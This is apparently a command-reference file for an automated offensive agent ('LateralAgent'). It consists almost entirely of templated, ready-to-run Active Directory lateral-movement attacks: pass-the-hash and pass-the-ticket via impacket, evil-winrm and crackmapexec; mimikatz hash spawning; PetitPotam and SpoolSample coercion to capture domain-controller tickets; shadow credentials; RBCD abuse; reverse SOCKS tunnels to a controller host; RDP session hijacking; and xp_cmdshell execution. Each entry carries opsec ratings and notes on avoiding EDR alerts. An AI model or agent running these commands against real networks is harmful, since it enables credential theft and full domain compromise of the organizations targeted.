# Lateral Movement — Tool commands reference

Templated commands the `LateralAgent` dispatches. Placeholders documented in
[../../discovering-environment/reference/tool-commands.md](../../discovering-environment/reference/tool-commands.md).

## Contents
- impacket-wmiexec (L1, L2, L3)
- evil-winrm (L4)
- crackmapexec (validation, bulk exec)
- rubeus (L2, L9, L13, L15)
- mimikatz (L1 pth-spawn)
- spoolsample / petitpotam (L13)
- pywhisker (L14)
- impacket-addcomputer + impacket-rbcd (L15)
- impacket-dcomexec / smbexec / psexec (L7, L5, L6)
- chisel / ligolo-ng (L11)
- tscon (L8)
- powerupsql (L16)

## `impacket-wmiexec`  (L1, L2, L3)

```yaml
tool: impacket-wmiexec
opsec: moderate
commands:
  - id: pth
    cmd: |
      wmiexec.py -hashes :{{ creds.selected.nt_hash }} \
        '{{ context.scope.domains[0] }}/{{ creds.selected.username }}@{{ target.host.ip }}'
    parser: parsers.remote_shell
    on_success:
      - "hosts[target].access_level = local_admin"
      - "attack_path[] += step lateral/wmi_pth"
  - id: ptt
    cmd: "KRB5CCNAME={{ creds.selected.ccache_path }} wmiexec.py -k -no-pass '{{ context.scope.domains[0] }}/{{ creds.selected.username }}@{{ target.host.fqdn }}'"
    parser: parsers.remote_shell
  - id: password
    cmd: "wmiexec.py '{{ context.scope.domains[0] }}/{{ creds.selected.username }}:{{ creds.selected | as_plaintext }}@{{ target.host.ip }}'"
    parser: parsers.remote_shell
```

## `evil-winrm`  (L4)

```yaml
tool: evil-winrm
opsec: moderate
commands:
  - id: pth
    cmd: "evil-winrm -i {{ target.host.ip }} -u {{ creds.selected.username }} -H {{ creds.selected.nt_hash }} -e {{ artifact.path }}"
    parser: parsers.remote_shell
  - id: password
    cmd: "evil-winrm -i {{ target.host.ip }} -u {{ creds.selected.username }} -p '{{ creds.selected | as_plaintext }}'"
    parser: parsers.remote_shell
```

## `crackmapexec`  (validation + bulk exec)

```yaml
tool: crackmapexec
opsec: moderate
commands:
  - id: validate_pth
    cmd: "crackmapexec smb {{ candidate_ips }} -u {{ creds.selected.username }} -H {{ creds.selected.nt_hash }} --json"
    parser: parsers.cme
    on_success: ["update credentials[].validated_against per Pwn3d! hits"]
  - id: exec_wmi
    cmd: "crackmapexec smb {{ target.host.ip }} -u {{ creds.selected.username }} -H {{ creds.selected.nt_hash }} -x '{{ payload.cmd }}' --exec-method wmiexec --json"
    parser: parsers.cme_exec
```

## `rubeus`  (L2, L9, L13, L15)

```yaml
tool: rubeus
opsec: stealth
commands:
  - id: ptt
    cmd: "Rubeus.exe ptt /ticket:{{ creds.selected | b64_kirbi }}"
    parser: parsers.rubeus_ptt
  - id: monitor_unconstrained
    cmd: "Rubeus.exe monitor /interval:5 /nowrap"
    parser: parsers.rubeus_monitor
    notes: "Run on the unconstrained-delegation host while coercion is triggered against the DC."
  - id: s4u_rbcd
    cmd: |
      Rubeus.exe s4u /user:{{ rbcd.controlled_computer }}$ /rc4:{{ rbcd.computer_hash }} \
        /impersonateuser:Administrator /msdsspn:cifs/{{ target.host.fqdn }} \
        /domain:{{ context.scope.domains[0] }} /ptt
    parser: parsers.rubeus_s4u
```

## `mimikatz`  (L1 pth-spawn)

```yaml
tool: mimikatz
opsec: loud
commands:
  - id: pth_spawn
    cmd: |
      "privilege::debug" \
      "sekurlsa::pth /user:{{ creds.selected.username }} /domain:{{ context.scope.domains[0] }} /ntlm:{{ creds.selected.nt_hash }} /run:{{ implant.spawn_cmd }}" \
      exit
    parser: parsers.process_whoami
```

## `spoolsample` / `petitpotam`  (L13)

```yaml
tool: spoolsample
opsec: moderate
preconditions: ["hosts.first(unconstrained_delegation=true, role!='DC').exists"]
commands:
  - id: coerce_dc
    cmd: "SpoolSample.exe {{ hosts.first(role='DC').fqdn }} {{ hosts.first(unconstrained_delegation=true, role!='DC').fqdn }}"
    parser: parsers.coerce_result
    pair_with: { tool: rubeus, command_id: monitor_unconstrained }
    on_success:
      - "credentials[] += captured TGT for DC$"
      - "pivot hint = accessing-credentials (dcsync)"

tool: petitpotam
opsec: moderate
commands:
  - id: coerce_efs
    cmd: "PetitPotam.py -u {{ creds.primary.username }} -p '{{ creds.primary | as_plaintext }}' -d {{ context.scope.domains[0] }} {{ relay_or_listener_ip }} {{ hosts.first(role='DC').ip }}"
    parser: parsers.coerce_result
```

## `pywhisker`  (L14)

```yaml
tool: pywhisker
opsec: stealth
preconditions: ["ad_graph has GenericWrite/GenericAll on msDS-KeyCredentialLink of target principal"]
commands:
  - id: add_shadow_cred
    cmd: |
      pywhisker -d {{ context.scope.domains[0] }} -u {{ creds.primary.username }} \
        {{ creds.primary | as_pywhisker_secret }} \
        --target {{ target.principal }} --action add --filename {{ artifact.path }}/shadow
    parser: parsers.pywhisker
    on_success: ["credentials[] += cert_pfx for target.principal; pivot=accessing-credentials (pkinit_to_tgt)"]
```

## `impacket-addcomputer` + `impacket-rbcd`  (L15)

```yaml
tool: impacket-addcomputer
opsec: stealth
preconditions: ["ad_graph has GenericWrite on target computer object"]
commands:
  - id: add_machine
    cmd: |
      addcomputer.py -computer-name 'rbcd$' -computer-pass 'P@ssw0rd!RBCD' \
        -dc-ip {{ hosts.first(role='DC').ip }} \
        '{{ context.scope.domains[0] }}/{{ creds.primary.username }}:{{ creds.primary | as_plaintext }}'
    parser: parsers.addcomputer

tool: impacket-rbcd
opsec: stealth
commands:
  - id: set_rbcd
    cmd: |
      rbcd.py -delegate-from 'rbcd$' -delegate-to '{{ target.host.samaccountname }}' -action 'write' \
        '{{ context.scope.domains[0] }}/{{ creds.primary.username }}:{{ creds.primary | as_plaintext }}'
    parser: parsers.rbcd
```

## `impacket-dcomexec` / `impacket-smbexec` / `impacket-psexec`  (L7, L5, L6)

```yaml
tool: impacket-dcomexec
opsec: moderate
commands:
  - id: pth
    cmd: "dcomexec.py -hashes :{{ creds.selected.nt_hash }} '{{ context.scope.domains[0] }}/{{ creds.selected.username }}@{{ target.host.ip }}' -object MMC20"
    parser: parsers.remote_shell

tool: impacket-smbexec
opsec: loud
commands:
  - id: pth
    cmd: "smbexec.py -hashes :{{ creds.selected.nt_hash }} '{{ context.scope.domains[0] }}/{{ creds.selected.username }}@{{ target.host.ip }}'"
    parser: parsers.remote_shell

tool: impacket-psexec
opsec: loud
notes: "Last resort. Creates service event 7045 — expect EDR alert."
commands:
  - id: pth
    cmd: "psexec.py -hashes :{{ creds.selected.nt_hash }} '{{ context.scope.domains[0] }}/{{ creds.selected.username }}@{{ target.host.ip }}'"
    parser: parsers.remote_shell
```

## `chisel` / `ligolo-ng`  (L11)

```yaml
tool: ligolo-ng
opsec: stealth
commands:
  - id: agent_connect
    cmd: "agent.exe -connect {{ pivot.controller_ip }}:{{ pivot.controller_port }} -ignore-cert"
    parser: parsers.pivot_session

tool: chisel
opsec: stealth
commands:
  - id: socks5_reverse
    cmd: "chisel.exe client {{ pivot.controller_ip }}:{{ pivot.controller_port }} R:socks"
    parser: parsers.pivot_session
```

## `tscon`  (L8)

```yaml
tool: tscon
opsec: moderate
preconditions: ["host.current.access_level == 'system'"]
commands:
  - id: hijack
    cmd: "tscon {{ rdp.session_id }} /dest:{{ rdp.dest_session }}"
    parser: parsers.tscon
```

## `powerupsql`  (L16)

```yaml
tool: powerupsql
opsec: moderate
commands:
  - id: link_crawl
    cmd: "Get-SQLServerLinkCrawl -Instance {{ sql.instance }} -Query 'SELECT @@VERSION,SYSTEM_USER,IS_SRVROLEMEMBER(''sysadmin'')'"
    parser: parsers.sql_crawl
  - id: link_xpcmd
    cmd: "Get-SQLServerLinkCrawl -Instance {{ sql.instance }} -Query 'EXEC master..xp_cmdshell ''{{ payload.cmd }}'''"
    parser: parsers.sql_crawl
```
